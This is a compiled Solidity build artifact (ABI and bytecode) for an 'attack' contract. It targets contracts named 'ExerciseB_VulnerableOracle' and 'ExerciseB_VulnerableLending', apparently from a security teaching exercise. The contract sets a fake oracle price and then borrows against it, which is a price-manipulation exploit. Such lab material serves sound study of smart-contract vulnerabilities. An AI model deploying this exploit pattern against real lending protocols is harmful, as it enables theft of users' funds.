{"abi":[{"type":"function","name":"attack","inputs":[{"name":"oracle","type":"address","internalType":"contract ExerciseB_VulnerableOracle"},{"name":"lending","type":"address","internalType":"contract ExerciseB_VulnerableLending"},{"name":"fakePrice","type":"uint256","internalType":"uint256"},{"name":"borrowAmount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"payable"}],"bytecode":{"object":"0x608060405234801561000f575f80fd5b5061030b8061001d5f395ff3fe60806040526004361061001d575f3560e01c80635dacc2b714610021575b5f80fd5b61003b60048036038101906100369190610249565b61003d565b005b8273ffffffffffffffffffffffffffffffffffffffff16636f758140346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610083575f80fd5b505af1158015610095573d5f803e3d5ffd5b50505050508373ffffffffffffffffffffffffffffffffffffffff166391b7f5ed836040518263ffffffff1660e01b81526004016100d391906102bc565b5f604051808303815f87803b1580156100ea575f80fd5b505af11580156100fc573d5f803e3d5ffd5b505050508273ffffffffffffffffffffffffffffffffffffffff1663c5ebeaec826040518263ffffffff1660e01b815260040161013991906102bc565b5f604051808303815f87803b158015610150575f80fd5b505af1158015610162573d5f803e3d5ffd5b5050505050505050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61019982610170565b9050919050565b5f6101aa8261018f565b9050919050565b6101ba816101a0565b81146101c4575f80fd5b50565b5f813590506101d5816101b1565b92915050565b5f6101e58261018f565b9050919050565b6101f5816101db565b81146101ff575f80fd5b50565b5f81359050610210816101ec565b92915050565b5f819050919050565b61022881610216565b8114610232575f80fd5b50565b5f813590506102438161021f565b92915050565b5f805f80608085870312156102615761026061016c565b5b5f61026e878288016101c7565b945050602061027f87828801610202565b935050604061029087828801610235565b92505060606102a187828801610235565b91505092959194509250565b6102b681610216565b82525050565b5f6020820190506102cf5f8301846102ad565b9291505056fea2646970667358221220bc59d05295f96fe5eb75ec5d87f67d213a81fc425d6eafe54646805b50fb129a64736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"attack(address,address,uint256,uint256)":"5dacc2b7"},"id":25}